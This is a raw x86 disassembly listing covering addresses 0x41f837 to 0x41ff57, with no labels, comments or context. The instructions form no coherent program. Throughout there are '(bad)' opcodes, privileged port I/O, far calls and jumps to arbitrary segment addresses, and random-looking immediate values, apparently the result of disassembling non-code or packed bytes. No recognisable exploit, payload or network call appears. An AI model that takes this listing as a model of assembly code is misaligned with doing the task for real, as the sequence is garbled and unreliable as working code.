  41f837:	add    dh,BYTE PTR [edx+0x25400232]
  41f83d:	mov    ebp,0xbc27406
  41f842:	sbb    eax,0x989f85cb
  41f847:	adc    DWORD PTR [eax-0x8186526],0x9196bdce
  41f851:	stos   BYTE PTR es:[edi],al
  41f852:	and    ah,BYTE PTR [edi+0x37830e4e]
  41f858:	ins    DWORD PTR es:[edi],dx
  41f859:	cmp    BYTE PTR [eax+0x3071b2f7],bl
  41f85f:	(bad)  
  41f860:	cli    
  41f861:	rcr    bh,0x56
  41f864:	lds    esi,FWORD PTR [esi]
  41f866:	dec    BYTE PTR [ebx+0x32]
  41f869:	imul   ecx,DWORD PTR [ebx],0xd03b2a23
  41f86f:	dec    esi
  41f870:	mov    gs,WORD PTR [edx]
  41f872:	es daa 
  41f874:	or     eax,0xaebee0a1
  41f879:	nop
  41f87a:	inc    esp
  41f87b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f87c:	std    
  41f87d:	outs   dx,BYTE PTR ds:[esi]
  41f87e:	inc    ebp
  41f87f:	adc    edx,DWORD PTR [edx+0x54]
  41f882:	sub    al,dh
  41f884:	xchg   esi,eax
  41f885:	aaa    
  41f886:	dec    ebx
  41f887:	shl    DWORD PTR [ebx-0x699e3e1a],cl
  41f88d:	and    DWORD PTR [edx+0x65],ecx
  41f890:	xchg   ecx,eax
  41f891:	or     ebp,DWORD PTR [ebx-0x5a]
  41f894:	xchg   ebp,eax
  41f895:	add    BYTE PTR [ecx-0x64490a01],cl
  41f89b:	arpl   WORD PTR ds:0x145260f3,ax
  41f8a1:	int3   
  41f8a2:	jbe    0x41f912
  41f8a4:	pop    ebp
  41f8a5:	or     esi,DWORD PTR [eax]
  41f8a7:	xchg   esp,eax
  41f8a8:	and    eax,ebx
  41f8aa:	loop   0x41f83f
  41f8ac:	fisttp WORD PTR [edi-0x6fc1ee63]
  41f8b2:	mov    edx,0x9b72d2aa
  41f8b7:	loopne 0x41f83a
  41f8b9:	add    al,0x83
  41f8bb:	jecxz  0x41f8de
  41f8bd:	(bad)  
  41f8be:	cli    
  41f8bf:	push   es
  41f8c0:	pushf  
  41f8c1:	dec    esi
  41f8c2:	aas    
  41f8c3:	popf   
  41f8c4:	mov    dl,0x7
  41f8c6:	iret   
  41f8c7:	sbb    al,0x29
  41f8c9:	arpl   WORD PTR [edx-0x53],cx
  41f8cc:	stc    
  41f8cd:	or     ebx,edx
  41f8cf:	dec    edi
  41f8d0:	in     al,0x8b
  41f8d2:	add    eax,0xb069727e
  41f8d7:	xor    cl,al
  41f8d9:	mov    edx,0x2c06cb95
  41f8de:	cmp    ah,dh
  41f8e0:	test   DWORD PTR [eax+0x3e63b9e1],ebx
  41f8e6:	cli    
  41f8e7:	test   DWORD PTR [ebx+ecx*1-0x2d],eax
  41f8eb:	icebp  
  41f8ec:	sub    eax,edi
  41f8ee:	push   cs
  41f8ef:	inc    esp
  41f8f0:	iret   
  41f8f1:	add    al,0x93
  41f8f3:	push   edi
  41f8f4:	pop    edi
  41f8f5:	fsubr  DWORD PTR [ebx]
  41f8f7:	daa    
  41f8f8:	stos   DWORD PTR es:[edi],eax
  41f8f9:	dec    esp
  41f8fa:	fwait
  41f8fb:	cmp    dl,BYTE PTR [edi]
  41f8fd:	or     ecx,DWORD PTR [esi-0x13]
  41f900:	mov    ds:0xcf77b7a1,al
  41f905:	fimul  DWORD PTR [edx]
  41f907:	out    dx,eax
  41f908:	mov    dl,0x4a
  41f90a:	bound  esp,QWORD PTR [ecx]
  41f90c:	xchg   edi,eax
  41f90d:	mov    esp,0x3146fc2a
  41f912:	lock jb 0x41f947
  41f915:	pushf  
  41f916:	inc    ecx
  41f917:	pop    DWORD PTR [ecx+0xf]
  41f91a:	repnz mov ?,WORD PTR [ecx+0x12d2d224]
  41f921:	out    0x6a,al
  41f923:	pop    ds
  41f924:	xor    BYTE PTR [edi-0x4a],cl
  41f927:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f928:	nop
  41f929:	ja     0x41f8af
  41f92b:	mov    eax,edx
  41f92d:	dec    edx
  41f92e:	in     eax,dx
  41f92f:	addr16 aas 
  41f931:	ds loopne 0x41f8db
  41f934:	ror    ebp,1
  41f936:	loope  0x41f9af
  41f938:	(bad)  
  41f939:	in     eax,0xf2
  41f93b:	jae    0x41f93f
  41f93d:	ficomp WORD PTR [edx-0x2974f632]
  41f943:	push   edi
  41f944:	mov    ebp,0x31d640af
  41f949:	add    eax,0xe13a6302
  41f94e:	fimul  DWORD PTR [eax-0x1a]
  41f951:	adc    cl,BYTE PTR ds:0x9bdfb285
  41f957:	outs   dx,DWORD PTR ds:[esi]
  41f958:	sbb    ch,cl
  41f95a:	data16 sub al,0x5f
  41f95d:	or     al,0xde
  41f95f:	pop    eax
  41f960:	retf   
  41f961:	adc    DWORD PTR [edx],edx
  41f963:	daa    
  41f964:	sub    ch,BYTE PTR [edi]
  41f966:	jmp    DWORD PTR [edx]
  41f968:	sub    cl,BYTE PTR [edi+0x778a2b9a]
  41f96e:	cwde   
  41f96f:	sbb    ecx,DWORD PTR [ebx-0x575aada0]
  41f975:	or     BYTE PTR [eax+0x6e],0x7e
  41f979:	(bad)  
  41f97a:	pop    edx
  41f97b:	xor    al,0xc6
  41f97d:	ss jmp 0x41f909
  41f980:	mov    bl,0x84
  41f982:	pop    ebp
  41f983:	shl    BYTE PTR [esi],0xab
  41f986:	xor    bh,BYTE PTR fs:[esi-0x36]
  41f98a:	aad    0xdf
  41f98c:	test   BYTE PTR [ebx],cl
  41f98e:	and    DWORD PTR [edx],eax
  41f990:	pop    ecx
  41f991:	add    BYTE PTR [ecx],0xef
  41f994:	lds    edx,FWORD PTR [edx]
  41f996:	xchg   esp,eax
  41f997:	shl    DWORD PTR [edx],1
  41f999:	jle    0x41f999
  41f99b:	out    0xd,eax
  41f99d:	add    BYTE PTR [ebp+0x16],al
  41f9a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9a1:	sbb    BYTE PTR [edx],dh
  41f9a3:	cmp    DWORD PTR [esi],0xc
  41f9a6:	adc    DWORD PTR [ecx+ebp*2-0x15],esp
  41f9aa:	lods   eax,DWORD PTR ds:[esi]
  41f9ab:	ins    BYTE PTR es:[edi],dx
  41f9ac:	inc    ebp
  41f9ad:	cmp    bl,BYTE PTR [edx-0x7ebb2bdc]
  41f9b3:	push   0xffffffb8
  41f9b5:	push   esp
  41f9b6:	sti    
  41f9b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9b8:	inc    edx
  41f9b9:	sub    al,BYTE PTR [edi+0x42f6443a]
  41f9bf:	aad    0x2b
  41f9c1:	fcom   QWORD PTR [ebp-0x798348e2]
  41f9c7:	aam    0xb2
  41f9c9:	and    esp,edi
  41f9cb:	shl    DWORD PTR [eax+0x7a],cl
  41f9ce:	mov    eax,ds:0x45dee5a7
  41f9d3:	inc    eax
  41f9d4:	test   eax,0xb3be2a43
  41f9d9:	sbb    ebp,DWORD PTR [ecx+0x7]
  41f9dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9dd:	jl     0x41fa57
  41f9df:	xor    edx,edx
  41f9e1:	mov    ah,al
  41f9e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9e4:	cmp    al,0xdc
  41f9e6:	mov    edx,0x3b4fdade
  41f9eb:	in     al,0xa5
  41f9ed:	mov    esp,0x6512fd90
  41f9f2:	ret    0xabb9
  41f9f5:	inc    esp
  41f9f6:	jg     0x41f9d1
  41f9f8:	mov    bl,0xd0
  41f9fa:	(bad)  [ebx-0x5]
  41f9fd:	or     esi,DWORD PTR [bp+di+0x60]
  41fa01:	stos   BYTE PTR es:[edi],al
  41fa02:	call   0x40a0:0xf25f04b1
  41fa09:	mov    dl,0x39
  41fa0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa0c:	fucomip st,st(3)
  41fa0e:	mov    bh,0xe9
  41fa10:	mov    ebp,0xb0f8b5a2
  41fa15:	sbb    DWORD PTR [esi-0x6c2b9c8e],ebx
  41fa1b:	(bad)  
  41fa1c:	mov    dl,0xc7
  41fa1e:	scas   eax,DWORD PTR es:[edi]
  41fa1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa20:	fwait
  41fa21:	add    esi,ebp
  41fa23:	or     dh,BYTE PTR [esi-0x5b]
  41fa26:	dec    edx
  41fa27:	int3   
  41fa28:	push   ebp
  41fa29:	arpl   WORD PTR [ebx+0x3870c0ed],bx
  41fa2f:	jnp    0x41faac
  41fa31:	mov    eax,0x3337697e
  41fa36:	pop    esp
  41fa37:	xchg   edx,eax
  41fa38:	mov    dl,0x24
  41fa3a:	out    dx,eax
  41fa3b:	pusha  
  41fa3c:	add    eax,0xb23e9ee9
  41fa41:	pop    es
  41fa42:	inc    edx
  41fa43:	push   ss
  41fa44:	sbb    ecx,DWORD PTR [eax+0x70]
  41fa47:	shr    DWORD PTR [eax],cl
  41fa49:	or     ah,BYTE PTR [eax-0x4dc0a8d]
  41fa4f:	fucomi st,st(3)
  41fa51:	sti    
  41fa52:	sub    edx,edi
  41fa54:	mov    ebp,0x6ce1d017
  41fa59:	jmp    0x41fa2c
  41fa5b:	mov    ah,0x85
  41fa5d:	and    BYTE PTR [edi-0x5a],dh
  41fa60:	push   ecx
  41fa61:	xor    al,0xa
  41fa63:	fs mov cl,0x45
  41fa66:	xor    esp,edi
  41fa68:	dec    esp
  41fa69:	jge    0x41fa50
  41fa6b:	repnz mov dl,0xe0
  41fa6e:	mov    ah,0x6c
  41fa70:	cs or  edx,0xffffff9f
  41fa74:	push   eax
  41fa75:	test   DWORD PTR [ebx],0x40b533a7
  41fa7b:	xchg   esi,esi
  41fa7d:	mov    al,0xce
  41fa7f:	fbstp  TBYTE PTR [edx+0x517a8f3b]
  41fa85:	xor    bh,BYTE PTR [ecx+0x59530298]
  41fa8b:	mov    al,0xb2
  41fa8d:	push   edx
  41fa8e:	in     eax,0x3
  41fa90:	loop   0x41fb07
  41fa92:	sub    eax,0x4a72b28b
  41fa97:	sbb    dl,BYTE PTR ds:0x727f805c
  41fa9d:	das    
  41fa9e:	and    ah,bl
  41faa0:	cmp    DWORD PTR [edx],ecx
  41faa2:	xchg   esi,eax
  41faa3:	jae    0x41fa99
  41faa5:	jmp    0x8c5249c6
  41faaa:	call   0x371a:0x20752154
  41fab1:	jp     0x41fa6e
  41fab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fab4:	adc    al,BYTE PTR [ebx-0xb38e71b]
  41faba:	test   eax,0x9dbcbcb7
  41fabf:	cmc    
  41fac0:	fucomi st,st(3)
  41fac2:	and    al,0x12
  41fac4:	imul   edx,DWORD PTR [edx+0x2fa5a779],0xa6152bb5
  41face:	je     0x41fa5e
  41fad0:	mov    dl,0xaa
  41fad2:	in     eax,0x3c
  41fad4:	pop    esi
  41fad5:	mov    al,0x68
  41fad7:	div    BYTE PTR [ecx+0xe576e0b]
  41fadd:	add    al,0x90
  41fadf:	xlat   BYTE PTR ds:[ebx]
  41fae0:	push   esi
  41fae1:	mov    ch,0x9a
  41fae3:	mov    edx,0x2d84b398
  41fae8:	pusha  
  41fae9:	mov    al,0xc3
  41faeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41faec:	sahf   
  41faed:	rcr    DWORD PTR [ebx+eiz*1+0x7e5adcb3],1
  41faf4:	mov    dl,0x38
  41faf6:	sub    ah,BYTE PTR [ebp-0x71]
  41faf9:	xchg   esp,eax
  41fafa:	jp     0x41fb67
  41fafc:	push   ebp
  41fafd:	or     al,bh
  41faff:	(bad)
  41fb03:	fbstp  TBYTE PTR [edx]
  41fb05:	push   eax
  41fb06:	lds    ebx,FWORD PTR [edi-0x5c]
  41fb09:	and    BYTE PTR [esi],dl
  41fb0b:	fidiv  WORD PTR [ebx-0x639ee5e4]
  41fb11:	xchg   esp,eax
  41fb12:	inc    ebx
  41fb13:	gs (bad) 
  41fb15:	(bad)  
  41fb16:	push   edi
  41fb17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb18:	(bad)  
  41fb19:	mov    dh,0x37
  41fb1b:	shr    BYTE PTR [esi+ebx*4],0x86
  41fb1f:	cmc    
  41fb20:	pushf  
  41fb21:	inc    eax
  41fb22:	push   edx
  41fb23:	pop    es
  41fb24:	mov    dl,0xf4
  41fb26:	lea    ecx,[edx*1+0x7b9fc491]
  41fb2d:	(bad)  
  41fb2e:	sbb    al,BYTE PTR [ebx+esi*8-0x7]
  41fb32:	jge    0x41fb9f
  41fb34:	pop    ss
  41fb35:	loope  0x41fbb1
  41fb37:	sbb    DWORD PTR [esi-0x5eec2651],esi
  41fb3d:	xchg   BYTE PTR [edx],bl
  41fb3f:	mov    edi,0xa7757d85
  41fb44:	pop    esp
  41fb45:	adc    DWORD PTR [ecx-0x2b],edx
  41fb48:	out    0x4a,eax
  41fb4a:	mov    edi,0xfeebb1d6
  41fb4f:	fldenv [edi]
  41fb51:	sbb    BYTE PTR [edi],al
  41fb53:	inc    esi
  41fb54:	aad    0xb3
  41fb56:	mov    edx,0xc0471cb6
  41fb5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb5c:	mov    ch,0x41
  41fb5e:	sti    
  41fb5f:	enter  0xcb46,0xa0
  41fb63:	outs   dx,DWORD PTR ds:[esi]
  41fb64:	mov    ah,0xa
  41fb66:	fwait
  41fb67:	stc    
  41fb68:	pop    ebx
  41fb69:	mov    edi,0x48072fc2
  41fb6e:	jbe    0x41fb43
  41fb70:	aam    0xb
  41fb72:	enter  0x511d,0xfb
  41fb76:	and    BYTE PTR [ebp-0xc],0xc0
  41fb7a:	jmp    0x993c:0x88f7b325
  41fb81:	cmc    
  41fb82:	dec    edi
  41fb83:	and    DWORD PTR [edx+0x50],ebx
  41fb86:	sar    BYTE PTR [edx-0x58cf7c29],cl
  41fb8c:	push   eax
  41fb8d:	ja     0x41fb6d
  41fb8f:	test   DWORD PTR [ebp-0x80],esp
  41fb92:	call   0x668f:0x13596eaa
  41fb99:	sti    
  41fb9a:	sub    edi,DWORD PTR [edx-0x58e31228]
  41fba0:	daa    
  41fba1:	inc    ebx
  41fba2:	sbb    edi,DWORD PTR [ebx-0x3865b6de]
  41fba8:	push   esi
  41fba9:	add    ebp,DWORD PTR [edx+ebx*2-0x46e78a29]
  41fbb0:	pop    edi
  41fbb1:	aam    0x99
  41fbb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbb4:	aam    0x93
  41fbb6:	add    edx,DWORD PTR [ecx-0x74]
  41fbb9:	add    bl,BYTE PTR [ebx+0x1b45e0f2]
  41fbbf:	dec    edi
  41fbc0:	leave  
  41fbc1:	cmp    esp,DWORD PTR [edx+0x70]
  41fbc4:	adc    al,0xb
  41fbc6:	fdivr  QWORD PTR [eax+0x2f0963a5]
  41fbcc:	sbb    al,0x47
  41fbce:	call   0x3bcc:0x20e13f9
  41fbd5:	push   eax
  41fbd6:	int    0xa7
  41fbd8:	(bad)  
  41fbd9:	lods   al,BYTE PTR ds:[esi]
  41fbda:	popf   
  41fbdb:	dec    ebx
  41fbdc:	dec    edx
  41fbdd:	pop    ebx
  41fbde:	push   es
  41fbdf:	push   esp
  41fbe0:	mov    dl,0x64
  41fbe2:	cmp    al,0x4e
  41fbe4:	or     ah,BYTE PTR [ebx+0xb11d76f]
  41fbea:	xchg   BYTE PTR [ebx-0x7bd5b1be],dh
  41fbf0:	add    DWORD PTR [ebp-0x66],ebp
  41fbf3:	jne    0x41fc0c
  41fbf5:	xor    BYTE PTR cs:[ecx-0x58367042],ah
  41fbfc:	jg     0x41fc5e
  41fbfe:	inc    edi
  41fbff:	sbb    esp,DWORD PTR [edx+0x66]
  41fc02:	(bad)  
  41fc03:	fbstp  TBYTE PTR [edx-0x60d0cd44]
  41fc09:	test   al,0x63
  41fc0b:	ret    0x80d
  41fc0e:	repnz cs mov dh,0xd9
  41fc12:	xchg   eax,ecx
  41fc14:	adc    dl,BYTE PTR [ecx]
  41fc16:	fcmovnu st,st(0)
  41fc18:	mov    dl,0x21
  41fc1a:	pop    esi
  41fc1b:	dec    esp
  41fc1c:	sbb    edx,esi
  41fc1e:	fistp  QWORD PTR [eax+0x7e]
  41fc21:	or     ecx,eax
  41fc23:	daa    
  41fc24:	sbb    esi,DWORD PTR [ebx]
  41fc26:	retf   0x580b
  41fc29:	rcr    DWORD PTR [edx+0x237d18b2],cl
  41fc2f:	inc    esi
  41fc30:	retf   
  41fc31:	popa   
  41fc32:	das    
  41fc33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc34:	xchg   ebp,eax
  41fc35:	bound  edx,QWORD PTR [eax+ebx*8]
  41fc38:	aaa    
  41fc39:	and    al,0x6e
  41fc3b:	add    eax,0x36a54aad
  41fc40:	mov    dl,0xde
  41fc42:	or     bh,bl
  41fc44:	jnp    0x41fc69
  41fc46:	add    al,0xa7
  41fc48:	pop    edx
  41fc49:	cdq    
  41fc4a:	jl     0x41fca1
  41fc4c:	dec    esi
  41fc4d:	cmp    bh,BYTE PTR [ecx]
  41fc4f:	dec    esi
  41fc50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc51:	inc    ecx
  41fc52:	out    0xc2,al
  41fc54:	mov    ch,0x6c
  41fc56:	xchg   edx,eax
  41fc57:	fwait
  41fc58:	ret    0xc46
  41fc5b:	mov    cl,BYTE PTR fs:[ebx]
  41fc5e:	(bad)  
  41fc5f:	jo     0x41fcca
  41fc61:	push   ebx
  41fc62:	cmp    BYTE PTR [esi+0x7f],bh
  41fc65:	push   cs
  41fc66:	cdq    
  41fc67:	sub    al,0xfc
  41fc69:	mov    edx,0xf33151b2
  41fc6e:	jo     0x41fc1a
  41fc70:	retf   0xf525
  41fc73:	leave  
  41fc74:	push   es
  41fc75:	or     ebp,DWORD PTR [esi]
  41fc77:	mov    esp,0x6f7cd767
  41fc7c:	mov    dl,0x18
  41fc7e:	lahf   
  41fc7f:	push   ds
  41fc80:	inc    edi
  41fc81:	mov    ah,0x9
  41fc83:	lock add cl,BYTE PTR [ebx]
  41fc86:	repz scas eax,DWORD PTR es:[edi]
  41fc88:	js     0x41fc7b
  41fc8a:	adc    BYTE PTR [ebp+0x4a664ab3],dl
  41fc90:	mov    dl,0x5b
  41fc92:	sbb    ebp,ecx
  41fc94:	sahf   
  41fc95:	fcomp  QWORD PTR [ecx-0x34f40f3c]
  41fc9b:	out    dx,al
  41fc9c:	inc    esi
  41fc9d:	shr    ebp,cl
  41fc9f:	pop    ebx
  41fca0:	stc    
  41fca1:	(bad)  
  41fca2:	call   0x5c1d:0xb102e1c9
  41fca9:	jae    0x41fd07
  41fcab:	xchg   edi,eax
  41fcac:	adc    BYTE PTR [ecx],bh
  41fcae:	sbb    BYTE PTR [edi+0x60],0x5
  41fcb2:	xchg   BYTE PTR [edi+0x795b48b9],bh
  41fcb8:	loope  0x41fc70
  41fcba:	jmp    0x41fc72
  41fcbc:	xchg   edx,eax
  41fcbd:	test   DWORD PTR [ecx-0x5a],edi
  41fcc0:	not    BYTE PTR [edi-0x58]
  41fcc3:	jbe    0x41fcd9
  41fcc5:	mov    eax,0xebc5c6fe
  41fcca:	pop    ebp
  41fccb:	in     al,dx
  41fccc:	mov    dl,0x47
  41fcce:	dec    edi
  41fccf:	inc    esi
  41fcd0:	xor    edi,ecx
  41fcd2:	add    bl,BYTE PTR [edx+0x1731426]
  41fcd8:	cdq    
  41fcd9:	retf   
  41fcda:	pop    eax
  41fcdb:	mov    bl,0xcd
  41fcdd:	(bad)  
  41fcde:	fsubr  QWORD PTR [ebx-0x4e]
  41fce1:	pop    eax
  41fce2:	sub    ebp,DWORD PTR [esi-0x3]
  41fce5:	pop    ecx
  41fce6:	mov    ecx,0xa90a257c
  41fceb:	sbb    BYTE PTR [edx+0x26],0xfe
  41fcef:	and    eax,0x124ac7cb
  41fcf4:	loop   0x41fd35
  41fcf6:	je     0x41fd57
  41fcf8:	lods   eax,DWORD PTR ds:[esi]
  41fcf9:	dec    eax
  41fcfa:	clc    
  41fcfb:	je     0x41fc85
  41fcfd:	test   ch,bl
  41fcff:	pop    eax
  41fd00:	sub    dl,BYTE PTR [bp-0x14]
  41fd04:	test   eax,0xbffb52ef
  41fd09:	or     eax,DWORD PTR [ebx-0x52]
  41fd0c:	jp     0x41fca0
  41fd0e:	outs   dx,BYTE PTR ds:[esi]
  41fd0f:	mov    bh,dl
  41fd11:	fistp  DWORD PTR [edx-0xc7cd862]
  41fd17:	pop    ecx
  41fd18:	lea    edi,[edx+0x2a51a4d1]
  41fd1e:	sub    DWORD PTR [ecx+0x3e024b35],ebx
  41fd24:	or     ebx,esp
  41fd26:	fwait
  41fd27:	(bad)  
  41fd28:	call   0x5f4e0cde
  41fd2d:	stos   DWORD PTR es:[edi],eax
  41fd2e:	cli    
  41fd2f:	inc    edi
  41fd30:	jo     0x41fd3e
  41fd32:	icebp  
  41fd33:	retf   
  41fd34:	sbb    BYTE PTR [edi+0xb645d66],ah
  41fd3a:	push   DWORD PTR [esp+esi*1]
  41fd3d:	xchg   bl,ch
  41fd3f:	push   edx
  41fd40:	mov    dl,0x8b
  41fd42:	test   dl,ch
  41fd44:	push   edi
  41fd45:	inc    edx
  41fd46:	shr    DWORD PTR [ebx],0x23
  41fd49:	or     DWORD PTR [ebp+0x7054a501],eax
  41fd4f:	or     cl,BYTE PTR [edi+0x6b]
  41fd52:	adc    al,0xf0
  41fd54:	xchg   ebx,eax
  41fd55:	sti    
  41fd56:	outs   dx,DWORD PTR ds:[esi]
  41fd57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd58:	daa    
  41fd59:	sar    BYTE PTR [eax-0xb],1
  41fd5c:	xor    al,0xe6
  41fd5e:	mov    eax,0x840244a3
  41fd63:	ja     0x41fd80
  41fd65:	inc    edx
  41fd66:	pop    edx
  41fd67:	stos   DWORD PTR es:[edi],eax
  41fd68:	retf   
  41fd69:	push   ecx
  41fd6a:	out    0x83,al
  41fd6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd6d:	sbb    DWORD PTR [esi-0x6bf447c6],esi
  41fd73:	adc    bl,ah
  41fd75:	ins    BYTE PTR es:[edi],dx
  41fd76:	mov    ecx,0x74bfb11d
  41fd7b:	clc    
  41fd7c:	lds    ebp,FWORD PTR [eax-0x5486d3d0]
  41fd82:	push   esi
  41fd83:	jmp    FWORD PTR [edx+esi*1-0x244d5d50]
  41fd8a:	mov    ds:0xa72b8599,al
  41fd8f:	jns    0x41fded
  41fd91:	pop    edi
  41fd92:	call   0xe103:0xe85b01cd
  41fd99:	popf   
  41fd9a:	shl    BYTE PTR [edi+0x5a771393],1
  41fda0:	push   es
  41fda1:	nop
  41fda2:	pop    esi
  41fda3:	call   0x95cd:0xafa02b2
  41fdaa:	sbb    al,dl
  41fdac:	lds    edi,FWORD PTR [esi-0x35]
  41fdaf:	pop    ecx
  41fdb0:	inc    ebx
  41fdb1:	adc    al,0xb0
  41fdb3:	and    al,0x9e
  41fdb5:	push   edi
  41fdb6:	dec    ebp
  41fdb7:	out    0xfe,eax
  41fdb9:	push   edi
  41fdba:	push   ecx
  41fdbb:	push   ss
  41fdbc:	js     0x41fe3b
  41fdbe:	popf   
  41fdbf:	push   esp
  41fdc0:	test   al,0x87
  41fdc2:	into   
  41fdc3:	push   ebp
  41fdc4:	mov    ds:0x30aef888,al
  41fdc9:	or     bl,BYTE PTR [edx]
  41fdcb:	jecxz  0x41fe33
  41fdcd:	loope  0x41fd7f
  41fdcf:	ins    BYTE PTR es:[edi],dx
  41fdd0:	shr    DWORD PTR [ebx],0x49
  41fdd3:	shl    BYTE PTR [ebx-0x6fa4310f],0x1e
  41fdda:	stc    
  41fddb:	jp     0x41fe3b
  41fddd:	mov    eax,0x46b9a785
  41fde2:	loop   0x41fd9e
  41fde4:	sub    dh,al
  41fde6:	lds    esp,FWORD PTR ds:0x158ba6b2
  41fdec:	sub    al,0x84
  41fdee:	or     al,0x3c
  41fdf0:	(bad)  
  41fdf1:	or     eax,DWORD PTR ds:0x7ab11df9
  41fdf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdf8:	dec    edx
  41fdf9:	adc    BYTE PTR [ebx-0x638a9152],bl
  41fdff:	(bad)  
  41fe00:	je     0x41fdfc
  41fe02:	pop    esi
  41fe03:	mov    edi,0x14f70bfe
  41fe08:	fsub   st(5),st
  41fe0a:	adc    ah,bh
  41fe0c:	enter  0x2a84,0x56
  41fe10:	mov    dl,0x29
  41fe12:	xchg   edi,eax
  41fe13:	xor    DWORD PTR [ebp+ebp*1+0xb5e74df],eax
  41fe1a:	dec    edx
  41fe1b:	and    bl,BYTE PTR [eax]
  41fe1d:	lock push es
  41fe1f:	mov    eax,ds:0x869ac997
  41fe24:	retf   
  41fe25:	adc    eax,0x3fe64d9d
  41fe2a:	xor    DWORD PTR [ebx+0x62],ebx
  41fe2d:	or     ebx,DWORD PTR [ebx-0x14]
  41fe30:	rcr    BYTE PTR [edi+0x7448afa4],1
  41fe36:	xchg   ebx,eax
  41fe37:	outs   dx,DWORD PTR ds:[esi]
  41fe38:	ret    0x3ee4
  41fe3b:	sub    DWORD PTR [ebp-0x10f3b775],ebx
  41fe41:	imul   ebp,DWORD PTR [eax],0xd636d1a6
  41fe47:	out    0xc6,al
  41fe49:	pop    ds
  41fe4a:	lahf   
  41fe4b:	push   edi
  41fe4c:	fistp  QWORD PTR [ecx]
  41fe4e:	xchg   ebp,eax
  41fe4f:	std    
  41fe50:	mov    edi,0x3a07b47c
  41fe55:	in     eax,0x2d
  41fe57:	test   DWORD PTR [eax+0xb],0xa92be64f
  41fe5e:	gs stc 
  41fe60:	push   eax
  41fe61:	push   ss
  41fe62:	mov    WORD PTR [edi-0x17645285],cs
  41fe68:	pop    ds
  41fe69:	(bad)  
  41fe6a:	push   ss
  41fe6b:	xchg   DWORD PTR [esi-0x19],ecx
  41fe6e:	sti    
  41fe6f:	call   0xe183:0x51ad07d
  41fe76:	and    al,0xd9
  41fe78:	cmp    eax,0x66e49b43
  41fe7d:	fadd   st,st(0)
  41fe7f:	mov    fs,WORD PTR [ecx+ebx*8]
  41fe82:	pop    edi
  41fe83:	cmp    eax,0xa7de1f7e
  41fe88:	ds jbe 0x41fead
  41fe8b:	test   ah,dl
  41fe8d:	outs   dx,DWORD PTR ds:[esi]
  41fe8e:	mov    al,ds:0xb5ecb232
  41fe93:	mov    esi,0x1cbdbf72
  41fe98:	push   0xe55d3d08
  41fe9d:	xchg   BYTE PTR [edx-0x7694a2c8],ah
  41fea3:	mov    edi,0xc29adbb7
  41fea8:	lods   eax,DWORD PTR ds:[esi]
  41fea9:	enter  0xa96b,0x1b
  41fead:	mov    gs,WORD PTR [ebp-0x77f32459]
  41feb3:	push   0x31
  41feb5:	idiv   bl
  41feb7:	lods   eax,DWORD PTR ds:[esi]
  41feb8:	loop   0x41fead
  41feba:	adc    dl,ch
  41febc:	mov    dl,0xa7
  41febe:	scas   al,BYTE PTR es:[edi]
  41febf:	cwde   
  41fec0:	shr    BYTE PTR [ebx+0x143e2893],0xc0
  41fec7:	enter  0xcb8e,0x8d
  41fecb:	ret    0x9e00
  41fece:	dec    eax
  41fecf:	mov    ah,0xb2
  41fed1:	inc    ebp
  41fed2:	lock sbb ch,BYTE PTR [ebp-0x752df7f6]
  41fed9:	mov    bl,0x37
  41fedb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fedc:	cmp    BYTE PTR [ebx],bh
  41fede:	call   0xc9986a2c
  41fee3:	pop    esp
  41fee4:	mov    dl,0x13
  41fee6:	retf   
  41fee7:	mov    esi,0xa5d0c5ed
  41feec:	jg     0x41fef8
  41feee:	ins    DWORD PTR es:[edi],dx
  41feef:	retfw  0x17e6
  41fef3:	jnp    0x10bd9a1a
  41fef9:	dec    edi
  41fefa:	cmc    
  41fefb:	inc    eax
  41fefc:	and    BYTE PTR [eax],0x93
  41feff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff00:	mov    bl,0x10
  41ff02:	sahf   
  41ff03:	popf   
  41ff04:	dec    edi
  41ff05:	sub    DWORD PTR [edx+0x23],eax
  41ff08:	mov    dl,0xae
  41ff0a:	sbb    al,BYTE PTR [ecx+0x4]
  41ff0d:	nop
  41ff0e:	and    DWORD PTR [edi],ebx
  41ff10:	pop    ebp
  41ff11:	or     ebp,DWORD PTR [edx+0x6a068a2d]
  41ff17:	shl    BYTE PTR [edi-0x6],0xd2
  41ff1b:	jp     0x41ff4a
  41ff1d:	or     esp,DWORD PTR [ebx+0x51]
  41ff20:	in     al,dx
  41ff21:	mov    eax,0xbc884be
  41ff26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff27:	outs   dx,DWORD PTR ds:[esi]
  41ff28:	add    al,0x27
  41ff2a:	mov    DWORD PTR [eax],ebx
  41ff2c:	jnp    0x41feae
  41ff2e:	mov    eax,ds:0x47b66e32
  41ff33:	popf   
  41ff34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff35:	mov    edx,ebx
  41ff37:	mov    WORD PTR [ebp-0x56],es
  41ff3a:	push   0x920c2a81
  41ff3f:	xchg   edi,eax
  41ff40:	sbb    DWORD PTR [edx+0x6881d776],ecx
  41ff46:	xor    eax,0x960fb29a
  41ff4b:	loop   0x41ffa0
  41ff4d:	aam    0x72
  41ff4f:	xchg   esi,eax
  41ff50:	xchg   BYTE PTR [edi*2+0x3a32c919],al
  41ff57:	sub    eax,0x5d469d5e
